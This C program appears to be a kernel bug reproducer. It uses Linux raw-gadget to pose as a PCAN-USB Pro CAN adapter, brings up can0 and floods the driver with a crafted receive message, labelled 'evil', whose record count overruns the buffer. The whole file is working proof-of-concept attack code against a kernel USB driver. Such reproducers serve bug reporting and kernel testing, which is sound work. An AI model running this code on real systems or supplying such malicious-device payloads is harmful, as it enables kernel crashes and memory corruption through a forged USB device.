// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/types.h>
#include <linux/usb/ch9.h>
#include <linux/usb/raw_gadget.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/can/netlink.h>
#include <net/if.h>

#define PCAN_VID			0x0c72
#define PCAN_USBPRO_PID			0x000d

#define PCAN_USBPRO_EP_CMDOUT		0x01
#define PCAN_USBPRO_EP_CMDIN		0x81
#define PCAN_USBPRO_EP_MSGOUT_0		0x02
#define PCAN_USBPRO_EP_MSGIN		0x82
#define PCAN_USBPRO_EP_MSGOUT_1		0x03

#define PCAN_USBPRO_RXMSG0		0x82
#define PCAN_USBPRO_RXTS		0x85

#define RX_BUFFER_SIZE			1024
#define MSG_HEADER_LEN			4
#define SIZEOF_RXTS			12
#define SIZEOF_RXMSG0			12

struct usb_raw_control_event {
	struct usb_raw_event	inner;
	struct usb_ctrlrequest	ctrl;
};

struct usb_raw_io_data {
	struct usb_raw_ep_io	inner;
	__u8			data[2048];
};

static int raw_fd = -1;

static int usb_raw_ep0_write(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io);
}

static int usb_raw_ep0_read(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
}

static struct usb_device_descriptor dev_desc = {
	.bLength		= USB_DT_DEVICE_SIZE,
	.bDescriptorType	= USB_DT_DEVICE,
	.bcdUSB			= 0x0200,
	.bDeviceClass		= 0,
	.bDeviceSubClass	= 0,
	.bDeviceProtocol	= 0,
	.bMaxPacketSize0	= 64,
	.idVendor		= PCAN_VID,
	.idProduct		= PCAN_USBPRO_PID,
	.bcdDevice		= 0x0100,
	.iManufacturer		= 0,
	.iProduct		= 0,
	.iSerialNumber		= 0,
	.bNumConfigurations	= 1,
};

#define NUM_EPS 5
static const __u8 ep_addrs[NUM_EPS] = {
	PCAN_USBPRO_EP_CMDOUT,
	PCAN_USBPRO_EP_CMDIN,
	PCAN_USBPRO_EP_MSGOUT_0,
	PCAN_USBPRO_EP_MSGIN,
	PCAN_USBPRO_EP_MSGOUT_1,
};

#define CONFIG_TOTAL_LEN (USB_DT_CONFIG_SIZE + USB_DT_INTERFACE_SIZE + \
			  NUM_EPS * USB_DT_ENDPOINT_SIZE)

static __u8 config_buf[CONFIG_TOTAL_LEN];

static void build_config_desc(void)
{
	struct usb_config_descriptor *c = (void *)config_buf;
	struct usb_interface_descriptor *i =
		(void *)(config_buf + USB_DT_CONFIG_SIZE);
	int n;

	memset(config_buf, 0, sizeof(config_buf));

	c->bLength		= USB_DT_CONFIG_SIZE;
	c->bDescriptorType	= USB_DT_CONFIG;
	c->wTotalLength		= CONFIG_TOTAL_LEN;
	c->bNumInterfaces	= 1;
	c->bConfigurationValue	= 1;
	c->iConfiguration	= 0;
	c->bmAttributes		= USB_CONFIG_ATT_ONE | USB_CONFIG_ATT_SELFPOWER;
	c->bMaxPower		= 0x32;

	i->bLength		= USB_DT_INTERFACE_SIZE;
	i->bDescriptorType	= USB_DT_INTERFACE;
	i->bInterfaceNumber	= 0;
	i->bAlternateSetting	= 0;
	i->bNumEndpoints	= NUM_EPS;
	i->bInterfaceClass	= 0xff;
	i->bInterfaceSubClass	= 0;
	i->bInterfaceProtocol	= 0;
	i->iInterface		= 0;

	for (n = 0; n < NUM_EPS; n++) {
		struct usb_endpoint_descriptor *e =
			(void *)(config_buf + USB_DT_CONFIG_SIZE +
				 USB_DT_INTERFACE_SIZE +
				 n * USB_DT_ENDPOINT_SIZE);
		e->bLength		= USB_DT_ENDPOINT_SIZE;
		e->bDescriptorType	= USB_DT_ENDPOINT;
		e->bEndpointAddress	= ep_addrs[n];
		e->bmAttributes		= USB_ENDPOINT_XFER_BULK;
		e->wMaxPacketSize	= 512;
		e->bInterval		= 0;
	}
}

static int ep_handles[NUM_EPS];
static volatile int stop_threads;

static void *ep_out_drain(void *arg)
{
	int h = *(int *)arg;
	struct usb_raw_io_data io;

	while (!stop_threads) {
		io.inner.ep = h;
		io.inner.flags = 0;
		io.inner.length = 512;
		if (ioctl(raw_fd, USB_RAW_IOCTL_EP_READ, &io) < 0)
			usleep(2000);
	}
	return NULL;
}

static void build_evil_msg(__u8 *buf)
{
	int off, nfill;
	__u8 *rec;

	memset(buf, 0, RX_BUFFER_SIZE);

	nfill = (RX_BUFFER_SIZE - MSG_HEADER_LEN - SIZEOF_RXMSG0) / SIZEOF_RXTS;

	buf[0] = (nfill + 1) & 0xff;
	buf[1] = ((nfill + 1) >> 8) & 0xff;

	off = MSG_HEADER_LEN;
	for (int n = 0; n < nfill; n++) {
		rec = buf + off;
		rec[0] = PCAN_USBPRO_RXTS;
		off += SIZEOF_RXTS;
	}

	rec = buf + off;
	rec[0] = PCAN_USBPRO_RXMSG0;
	rec[1] = 0x00;
	rec[2] = 0x00;
	rec[3] = 0x0f;

}

static void *ep_msgin_flood(void *arg)
{
	int h = *(int *)arg;
	struct usb_raw_io_data io;
	__u8 evil[RX_BUFFER_SIZE];

	build_evil_msg(evil);

	while (!stop_threads) {
		io.inner.ep = h;
		io.inner.flags = 0;
		io.inner.length = RX_BUFFER_SIZE;
		memcpy(io.inner.data, evil, RX_BUFFER_SIZE);
		if (ioctl(raw_fd, USB_RAW_IOCTL_EP_WRITE, &io) < 0)
			usleep(2000);
	}
	return NULL;
}

static struct rtattr *nl_nest_start(struct nlmsghdr *nh, int type)
{
	struct rtattr *nest = (struct rtattr *)((char *)nh +
						NLMSG_ALIGN(nh->nlmsg_len));
	nest->rta_type = type;
	nest->rta_len = RTA_LENGTH(0);
	nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_LENGTH(0);
	return nest;
}

static void nl_nest_end(struct nlmsghdr *nh, struct rtattr *nest)
{
	nest->rta_len = (char *)nh + nh->nlmsg_len - (char *)nest;
}

static void nl_addattr(struct nlmsghdr *nh, int type, const void *data, int len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nh +
					       NLMSG_ALIGN(nh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(len);
	if (len)
		memcpy(RTA_DATA(rta), data, len);
	nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(RTA_LENGTH(len));
}

static int set_can_bitrate(const char *ifname, __u32 bitrate)
{
	struct {
		struct nlmsghdr		nh;
		struct ifinfomsg	ifi;
		char			buf[512];
	} req;
	struct rtattr *linkinfo, *infodata;
	struct can_bittiming bt;
	struct sockaddr_nl sa;
	char rbuf[4096];
	int fd, idx, ret;

	idx = if_nametoindex(ifname);
	if (!idx)
		return -1;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		return -1;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}

	memset(&req, 0, sizeof(req));
	req.nh.nlmsg_len   = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.nh.nlmsg_type  = RTM_NEWLINK;
	req.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.nh.nlmsg_seq   = 1;
	req.ifi.ifi_family = AF_UNSPEC;
	req.ifi.ifi_index  = idx;

	memset(&bt, 0, sizeof(bt));
	bt.bitrate = bitrate;

	linkinfo = nl_nest_start(&req.nh, IFLA_LINKINFO);
	nl_addattr(&req.nh, IFLA_INFO_KIND, "can", 3);
	infodata = nl_nest_start(&req.nh, IFLA_INFO_DATA);
	nl_addattr(&req.nh, IFLA_CAN_BITTIMING, &bt, sizeof(bt));
	nl_nest_end(&req.nh, infodata);
	nl_nest_end(&req.nh, linkinfo);

	if (send(fd, &req, req.nh.nlmsg_len, 0) < 0) {
		close(fd);
		return -1;
	}

	ret = recv(fd, rbuf, sizeof(rbuf), 0);
	if (ret > 0) {
		struct nlmsghdr *r = (struct nlmsghdr *)rbuf;
		if (r->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = NLMSG_DATA(r);
			if (e->error)
				printf("[-] set bitrate: netlink error %d\n",
				       e->error);
			else
				printf("[+] bitrate %u set on %s\n",
				       bitrate, ifname);
		}
	}
	close(fd);
	return 0;
}

static int iface_up(const char *ifname)
{
	struct ifreq ifr;
	int fd, ret;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return -1;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
		close(fd);
		return -1;
	}
	ifr.ifr_flags |= IFF_UP;
	ret = ioctl(fd, SIOCSIFFLAGS, &ifr);
	close(fd);
	return ret;
}

static void *net_up_thread(void *arg)
{
	int i;

	for (i = 0; i < 600; i++) {
		if (if_nametoindex("can0"))
			break;
		usleep(50000);
	}
	if (!if_nametoindex("can0")) {
		printf("[-] can0 never appeared\n");
		return NULL;
	}
	printf("[+] can0 registered\n");

	set_can_bitrate("can0", 500000);
	usleep(200000);

	if (iface_up("can0") < 0)
		printf("[-] failed to bring can0 up: %s\n", strerror(errno));
	else
		printf("[+] can0 is up — flooding EP 0x82 with the evil record\n");

	return NULL;
}

int main(void)
{
	struct usb_raw_init init;
	struct usb_raw_control_event ev;
	struct usb_raw_io_data io;
	pthread_t th;
	int i, started = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	build_config_desc();

	raw_fd = open("/dev/raw-gadget", O_RDWR);
	if (raw_fd < 0) {
		printf("[-] open(/dev/raw-gadget): %s\n", strerror(errno));
		return 1;
	}

	memset(&init, 0, sizeof(init));
	strcpy((char *)init.driver_name, "dummy_udc");
	strcpy((char *)init.device_name, "dummy_udc.0");
	init.speed = USB_SPEED_HIGH;
	if (ioctl(raw_fd, USB_RAW_IOCTL_INIT, &init) < 0) {
		printf("[-] USB_RAW_IOCTL_INIT: %s\n", strerror(errno));
		return 1;
	}
	if (ioctl(raw_fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		printf("[-] USB_RAW_IOCTL_RUN: %s\n", strerror(errno));
		return 1;
	}
	printf("[+] raw-gadget running, emulating PCAN-USB Pro %04x:%04x\n",
	       PCAN_VID, PCAN_USBPRO_PID);

	for (;;) {
		memset(&ev, 0, sizeof(ev));
		ev.inner.type = 0;
		ev.inner.length = sizeof(ev.ctrl);
		if (ioctl(raw_fd, USB_RAW_IOCTL_EVENT_FETCH, &ev.inner) < 0) {
			printf("[-] EVENT_FETCH: %s\n", strerror(errno));
			break;
		}
		if (ev.inner.type != USB_RAW_EVENT_CONTROL)
			continue;

		{
		__u8 rt = ev.ctrl.bRequestType;
		__u8 rq = ev.ctrl.bRequest;
		__u16 wv = ev.ctrl.wValue;
		__u16 wl = ev.ctrl.wLength;
		int len = -1;

		memset(&io, 0, sizeof(io));
		io.inner.ep = 0;
		io.inner.flags = 0;

		if ((rt & USB_TYPE_MASK) == USB_TYPE_STANDARD) {
			switch (rq) {
			case USB_REQ_GET_DESCRIPTOR:
				switch (wv >> 8) {
				case USB_DT_DEVICE:
					len = sizeof(dev_desc);
					if (len > wl)
						len = wl;
					memcpy(io.inner.data, &dev_desc, len);
					break;
				case USB_DT_CONFIG:
					len = CONFIG_TOTAL_LEN;
					if (len > wl)
						len = wl;
					memcpy(io.inner.data, config_buf, len);
					break;
				default:
					len = -1;
					break;
				}
				break;
			case USB_REQ_SET_CONFIGURATION:
				if (!started) {
					for (i = 0; i < NUM_EPS; i++) {
						struct usb_endpoint_descriptor *e =
							(void *)(config_buf +
								 USB_DT_CONFIG_SIZE +
								 USB_DT_INTERFACE_SIZE +
								 i * USB_DT_ENDPOINT_SIZE);
						ep_handles[i] = ioctl(raw_fd,
							USB_RAW_IOCTL_EP_ENABLE, e);
						if (ep_handles[i] < 0) {
							printf("[-] EP_ENABLE %02x: %s\n",
							       ep_addrs[i],
							       strerror(errno));
							return 1;
						}
					}
					ioctl(raw_fd, USB_RAW_IOCTL_VBUS_DRAW, 0x32);
					if (ioctl(raw_fd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
						printf("[-] CONFIGURE: %s\n",
						       strerror(errno));

					pthread_create(&th, NULL, ep_out_drain,
						       &ep_handles[0]);
					pthread_create(&th, NULL, ep_out_drain,
						       &ep_handles[2]);
					pthread_create(&th, NULL, ep_out_drain,
						       &ep_handles[4]);

					pthread_create(&th, NULL, ep_msgin_flood,
						       &ep_handles[3]);

					pthread_create(&th, NULL, net_up_thread,
						       NULL);
					started = 1;
					printf("[+] configured, endpoints enabled\n");
				}
				len = 0;
				break;
			case USB_REQ_SET_INTERFACE:
				len = 0;
				break;
			case USB_REQ_GET_STATUS:
				len = (wl < 2) ? wl : 2;
				memset(io.inner.data, 0, 2);
				break;
			case USB_REQ_GET_CONFIGURATION:
				len = (wl < 1) ? wl : 1;
				io.inner.data[0] = 1;
				break;
			default:
				len = -1;
				break;
			}
		} else if ((rt & USB_TYPE_MASK) == USB_TYPE_VENDOR) {

			len = wl;
			if (len > (int)sizeof(io.data))
				len = sizeof(io.data);
			memset(io.inner.data, 0, len);
		} else {
			len = -1;
		}

		if (len < 0) {
			ioctl(raw_fd, USB_RAW_IOCTL_EP0_STALL, 0);
			continue;
		}

		io.inner.length = len;
		if ((rt & USB_DIR_IN) && ev.ctrl.wLength)
			usb_raw_ep0_write(raw_fd, &io.inner);
		else
			usb_raw_ep0_read(raw_fd, &io.inner);
		}
	}

	return 0;
}
